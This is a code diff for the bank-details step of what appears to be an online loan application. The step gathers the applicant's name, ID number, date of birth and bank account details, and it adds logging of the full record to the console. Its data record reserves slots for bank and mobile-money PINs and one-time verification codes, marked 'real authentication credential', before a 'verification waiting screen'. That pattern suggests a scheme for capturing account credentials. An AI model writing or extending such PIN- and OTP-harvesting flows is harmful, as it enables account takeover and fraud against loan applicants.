@@ -988,11 +988,9 @@ function loadBankDetailsScreen() {
         );
 
 }
-// ======================================================
-// PART 10 - SAVE BANK DETAILS
-// APPLICATION CREATION
-// ======================================================
-
+//============================================
+//SAVE BANK DETAILS 
+//=============================================
 async function saveBankDetails() {
 
     const accountName =
@@ -1009,72 +1007,99 @@ async function saveBankDetails() {
         phone === "" ||
         accountNumber === ""
     ) {
-
         alert("Please complete all bank details.");
-
         return;
     }
 
-    // Save locally for the current application
+    // Save bank details for the current session
     sessionStorage.setItem("accountName", accountName);
     sessionStorage.setItem("bankPhone", phone);
     sessionStorage.setItem("accountNumber", accountNumber);
 
-    // Prepare application for the server
+    // Convert stored values to database-friendly numbers
+    const loanAmount =
+        parseFloat(
+            sessionStorage.getItem("loanAmount") || "0"
+        );
+
+    const loanPeriodRaw =
+        sessionStorage.getItem("loanPeriod") || "0";
+
+    const loanPeriod =
+        parseInt(
+            loanPeriodRaw,
+            10
+        ) || 0;
+
+    const monthlyRepayment =
+        parseFloat(
+            sessionStorage.getItem("monthlyRepayment") || "0"
+        );
+
+    const totalRepayment =
+        parseFloat(
+            sessionStorage.getItem("totalRepayment") || "0"
+        );
+
     const data = {
 
         fullNames:
-            sessionStorage.getItem("fullNames"),
+            sessionStorage.getItem("fullNames") || "",
 
         dateOfBirth:
-            sessionStorage.getItem("dateOfBirth"),
+            sessionStorage.getItem("dateOfBirth") || "",
 
         idNumber:
-            sessionStorage.getItem("idNumber"),
+            sessionStorage.getItem("idNumber") || "",
 
         occupation:
-            sessionStorage.getItem("occupation"),
+            sessionStorage.getItem("occupation") || "",
 
         loanPurpose:
-            sessionStorage.getItem("loanPurpose"),
+            sessionStorage.getItem("loanPurpose") || "",
 
         loanAmount:
-            sessionStorage.getItem("loanAmount"),
+            loanAmount,
 
         loanPeriod:
-            sessionStorage.getItem("loanPeriod"),
+            loanPeriod,
 
         monthlyRepayment:
-            sessionStorage.getItem("monthlyRepayment"),
+            monthlyRepayment,
 
         totalRepayment:
-            sessionStorage.getItem("totalRepayment"),
+            totalRepayment,
 
-        disbursementMethod: "Bank",
+        disbursementMethod:
+            "Bank",
 
         selectedBank:
             sessionStorage.getItem("selectedBank") || "",
 
-        accountName: accountName,
+        accountName:
+            accountName,
 
-        bankPhone: phone,
+        bankPhone:
+            phone,
 
-        accountNumber: accountNumber,
+        accountNumber:
+            accountNumber,
 
-        // store a real OTP here
+        // real authentication credential
         bankverificationCode: "",
 
         bankPin: "",
 
         ecoName: "",
-
         ecoNumber: "",
-
         ecoVerificationCode: "",
-
         ecoPin: ""
-
     };
+
+    console.log(
+        "Submitting bank application:",
+        data
+    );
 
     try {
 
@@ -1091,30 +1116,38 @@ async function saveBankDetails() {
             }
         );
 
-        const result = await response.json();
+        const result =
+            await response.json();
 
-        if (!response.ok || !result.success) {
+        console.log(
+            "Server response:",
+            result
+        );
+
+        if (
+            !response.ok ||
+            !result.success
+        ) {
 
             throw new Error(
                 result.error ||
+                result.message ||
                 "Unable to save application."
             );
-
         }
 
-        // IMPORTANT:
-        // Save the database application ID
+        // Save database application ID
         sessionStorage.setItem(
             "applicationId",
             result.application.id
         );
 
         console.log(
-            "Application saved:",
+            "Application saved successfully:",
             result.application.id
         );
 
-        // Now show the waiting screen
+        // Continue to the next demo screen
         loadBankVerificationWaitingScreen();
 
     } catch (error) {
@@ -1131,6 +1164,7 @@ async function saveBankDetails() {
     }
 
 }
+
 // ======================================================
 // PART 11 - BANK VERIFICATION WAITING SCREEN
 // ======================================================
